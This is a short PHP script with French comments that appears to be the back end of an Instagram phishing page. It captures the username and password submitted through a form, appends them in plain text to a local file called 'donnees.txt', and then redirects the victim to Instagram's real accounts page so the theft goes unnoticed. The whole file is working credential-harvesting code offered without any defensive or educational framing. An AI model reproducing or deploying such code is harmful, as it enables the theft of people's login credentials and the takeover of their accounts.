<?php
// Vérifie si des données ont été soumises
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupère les valeurs des champs du formulaire
    $username = $_POST["username"] ?? "";
    $password = $_POST["password"] ?? "";

    // Chemin vers le fichier de sauvegarde
    $file = "donnees.txt";

    // Ouvre le fichier en mode écriture, ajoute les données et ferme le fichier
    $content = "Username: " . $username . "\nPassword: " . $password . "\n\n";
    file_put_contents($file, $content, FILE_APPEND | LOCK_EX);

    // Redirige vers la page Instagram
    header("Location: https://www.instagram.com/accounts/?hl=en");
    exit();
}
?>
